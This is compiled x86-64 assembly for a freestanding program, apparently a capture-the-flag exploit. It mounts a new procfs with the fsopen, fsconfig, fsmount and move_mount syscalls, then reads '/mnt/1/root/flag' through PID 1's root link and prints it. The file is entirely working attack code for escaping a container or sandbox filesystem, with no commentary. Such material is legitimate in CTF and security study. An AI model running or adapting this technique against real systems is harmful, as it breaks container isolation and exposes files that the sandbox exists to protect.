	.file	"src.c"
	.text
	.globl	syscall
	.type	syscall, @function
syscall:
	
	movq	%r9, -8(%rsp)
	movl	$32, %r9d
	movq	%rdi, %rax
	movq	%rcx, -24(%rsp)
	leaq	-48(%rsp), %rcx
	movq	%r8, -16(%rsp)
	movq	%r9, %r8
	addq	%rcx, %r9
	movq	%rdx, -32(%rsp)
	addl	$8, %r8d
	leaq	8(%rsp), %rdx
	movq	%rsi, -40(%rsp)
	movq	(%r9), %r10
	movl	%r8d, %r9d
	movq	8(%rcx), %rdi
	movq	16(%rcx), %rsi
	movq	%rdx, -64(%rsp)
	movq	%rcx, -56(%rsp)
	movq	24(%rcx), %rdx
	movl	%r8d, -72(%rsp)
	cmpl	$47, %r8d
	ja	.L10
	movl	%r8d, %r8d
	addl	$8, %r9d
	movl	%r9d, -72(%rsp)
	addq	%rcx, %r8
	jmp	.L11
.L10:
	movq	-64(%rsp), %r8
	leaq	8(%r8), %r9
	movq	%r9, -64(%rsp)
.L11:
	movl	-72(%rsp), %r9d
	movq	(%r8), %r8
	addq	%r9, %rcx
	cmpl	$47, %r9d
	jbe	.L13
	movq	-64(%rsp), %rcx
.L13:
	movq	(%rcx), %r9
#APP
# 46 "src.c" 1
	syscall
# 0 "" 2
#NO_APP
	ret
	
	.globl	read
	.type	read, @function
read:
	
	movq	%rdx, %rcx
	xorl	%eax, %eax
	movq	%rsi, %rdx
	movl	%edi, %esi
	xorl	%edi, %edi
	jmp	syscall
	
	.globl	open
	.type	open, @function
open:
	
	subq	$80, %rsp
	movl	%esi, %r8d
	andl	$4259904, %esi
	movq	%rdi, %r9
	leaq	88(%rsp), %rax
	movq	%rdx, 48(%rsp)
	movq	%rax, 16(%rsp)
	leaq	32(%rsp), %rax
	movl	$16, 8(%rsp)
	movq	%rax, 24(%rsp)
	je	.L22
	movl	16(%rax), %ecx
	jmp	.L17
.L22:
	xorl	%ecx, %ecx
.L17:
	movl	%r8d, %edx
	movq	%r9, %rsi
	movl	$2, %edi
	xorl	%eax, %eax
	call	syscall
	addq	$80, %rsp
	ret
	
	.globl	write
	.type	write, @function
write:
	
	movq	%rdx, %rcx
	xorl	%eax, %eax
	movq	%rsi, %rdx
	movl	%edi, %esi
	movl	$1, %edi
	jmp	syscall
	
	.globl	close
	.type	close, @function
close:
	
	movl	%edi, %esi
	xorl	%eax, %eax
	movl	$3, %edi
	call	syscall
	ret
	
	.globl	_exit
	.type	_exit, @function
_exit:
	
	pushq	%rbx
	movl	%edi, %ebx
.L27:
	movl	%ebx, %esi
	movl	$60, %edi
	xorl	%eax, %eax
	call	syscall
	jmp	.L27
	
	.globl	execve
	.type	execve, @function
execve:
	
	movq	%rdx, %rcx
	xorl	%eax, %eax
	movq	%rsi, %rdx
	movq	%rdi, %rsi
	movl	$59, %edi
	call	syscall
	ret
	
	.globl	fsopen
	.type	fsopen, @function
fsopen:
	
	movl	%esi, %edx
	xorl	%eax, %eax
	movq	%rdi, %rsi
	movl	$430, %edi
	call	syscall
	ret
	
	.globl	fsmount
	.type	fsmount, @function
fsmount:
	
	movl	%edx, %ecx
	xorl	%eax, %eax
	movl	%esi, %edx
	movslq	%edi, %rsi
	movl	$432, %edi
	call	syscall
	ret
	
	.globl	fsconfig
	.type	fsconfig, @function
fsconfig:
	
	movq	%rdx, %r10
	movslq	%r8d, %r9
	movl	%esi, %edx
	movq	%rcx, %r8
	movslq	%edi, %rsi
	movq	%r10, %rcx
	movl	$431, %edi
	xorl	%eax, %eax
	call	syscall
	ret
	
	.globl	move_mount
	.type	move_mount, @function
move_mount:
	
	movq	%rsi, %r10
	movq	%rcx, %r11
	movslq	%edi, %rsi
	movslq	%edx, %rcx
	movl	%r8d, %r9d
	movq	%r10, %rdx
	movq	%r11, %r8
	movl	$429, %edi
	xorl	%eax, %eax
	call	syscall
	ret
	
	.globl	mkdir
	.type	mkdir, @function
mkdir:
	
	movslq	%esi, %rdx
	xorl	%eax, %eax
	movq	%rdi, %rsi
	movl	$83, %edi
	call	syscall
	ret
	
	
.LC0:
	.string	"proc"
.LC1:
	.string	"/mnt"
.LC2:
	.string	""
.LC3:
	.string	"/mnt/1/root/flag"
	.text
	.globl	_start
	.type	_start, @function
_start:
	
	pushq	%r12
	leaq	.LC0(%rip), %rdi
	movl	$1, %esi
	pushq	%rbp
	subq	$112, %rsp
	call	fsopen
	movl	$1, %edi
	testl	%eax, %eax
	js	.L40
	xorl	%r8d, %r8d
	xorl	%ecx, %ecx
	movl	%eax, %ebp
	xorl	%edx, %edx
	movl	$6, %esi
	movl	%eax, %edi
	call	fsconfig
	xorl	%edx, %edx
	movl	$1, %esi
	movl	%ebp, %edi
	call	fsmount
	movl	%ebp, %edi
	movl	%eax, %r12d
	call	close
	movl	$511, %esi
	leaq	.LC1(%rip), %rdi
	call	mkdir
	movl	$4, %r8d
	movl	%r12d, %edi
	leaq	.LC1(%rip), %rcx
	movl	$-100, %edx
	leaq	.LC2(%rip), %rsi
	call	move_mount
	testl	%eax, %eax
	jns	.L37
	movl	$2, %edi
.L40:
	call	_exit
.L37:
	movl	%r12d, %edi
	call	close
	xorl	%esi, %esi
	leaq	.LC3(%rip), %rdi
	xorl	%eax, %eax
	call	open
	movl	%eax, %ebp
	testl	%eax, %eax
	js	.L38
	leaq	12(%rsp), %r12
	movl	$100, %edx
	movl	%eax, %edi
	movq	%r12, %rsi
	call	read
	movl	$1, %edi
	movq	%r12, %rsi
	movslq	%eax, %rdx
	call	write
	movl	%ebp, %edi
	call	close
.L38:
	xorl	%edi, %edi
	jmp	.L40
	
	
	
	
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
